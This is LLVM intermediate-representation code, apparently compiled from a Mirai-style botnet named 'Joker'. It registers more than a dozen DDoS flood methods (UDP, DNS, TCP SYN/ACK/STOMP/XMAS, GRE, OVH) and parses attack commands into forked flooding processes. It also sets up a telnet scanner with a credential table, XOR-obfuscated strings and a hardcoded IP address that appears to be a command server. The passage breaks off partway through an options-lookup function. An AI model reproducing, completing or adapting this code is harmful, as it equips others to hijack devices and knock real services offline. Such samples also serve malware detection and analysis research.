; ModuleID = 'host/ir_O2/Joker.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set.28 = type { [16 x i64] }
%struct.timeval.29 = type { i64, i64 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanner_pid = common local_unnamed_addr global i32 0, align 4
@fake_time = local_unnamed_addr global i32 0, align 4
@conn_table = common local_unnamed_addr global %struct.scanner_connection* null, align 8
@rsck = common local_unnamed_addr global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"173.232.146.173\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = local_unnamed_addr global i16 0, align 2
@auth_table_len = local_unnamed_addr global i32 0, align 4
@auth_table = local_unnamed_addr global %struct.scanner_auth* null, align 8
@table = common local_unnamed_addr global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpgeneric)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpvse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpdns)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpsyn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstomp)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpxmas)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greeth)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_std)
  tail call fastcc void @add_attack(i8 zeroext 14, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_ovh)
  tail call fastcc void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpusyn)
  tail call fastcc void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpall)
  tail call fastcc void @add_attack(i8 zeroext 13, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpfrag)
  tail call fastcc void @add_attack(i8 zeroext 15, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_asyn)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #10
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %6 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #10
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #10
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %16 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %20, label %18

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 @kill(i32 %16, i32 9) #10
  br label %20

; <label>:20:                                     ; preds = %18, %15
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %21 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %25, label %23

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @kill(i32 %21, i32 9) #10
  br label %25

; <label>:25:                                     ; preds = %23, %20
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %26 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %30, label %28

; <label>:28:                                     ; preds = %25
  %29 = tail call i32 @kill(i32 %26, i32 9) #10
  br label %30

; <label>:30:                                     ; preds = %28, %25
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %31 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #10
  br label %35

; <label>:35:                                     ; preds = %33, %30
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %36 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = tail call i32 @kill(i32 %36, i32 9) #10
  br label %40

; <label>:40:                                     ; preds = %38, %35
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %41 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %45, label %43

; <label>:43:                                     ; preds = %40
  %44 = tail call i32 @kill(i32 %41, i32 9) #10
  br label %45

; <label>:45:                                     ; preds = %43, %40
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %46 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %50, label %48

; <label>:48:                                     ; preds = %45
  %49 = tail call i32 @kill(i32 %46, i32 9) #10
  br label %50

; <label>:50:                                     ; preds = %48, %45
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %51 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %50
  %54 = tail call i32 @kill(i32 %51, i32 9) #10
  br label %55

; <label>:55:                                     ; preds = %53, %50
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %56 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %58

; <label>:58:                                     ; preds = %55
  %59 = tail call i32 @kill(i32 %56, i32 9) #10
  br label %60

; <label>:60:                                     ; preds = %58, %55
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %61 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %63

; <label>:63:                                     ; preds = %60
  %64 = tail call i32 @kill(i32 %61, i32 9) #10
  br label %65

; <label>:65:                                     ; preds = %63, %60
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %66 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %70, label %68

; <label>:68:                                     ; preds = %65
  %69 = tail call i32 @kill(i32 %66, i32 9) #10
  br label %70

; <label>:70:                                     ; preds = %68, %65
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %71 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %70
  %74 = tail call i32 @kill(i32 %71, i32 9) #10
  br label %75

; <label>:75:                                     ; preds = %73, %70
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  tail call void @scanner_init() #10
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #10
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #10
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #10
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #11
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #10
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #12
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #10
  %20 = tail call i32 @getppid() #10
  %21 = tail call i32 @kill(i32 %20, i32 9) #10
  tail call void @exit(i32 0) #12
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
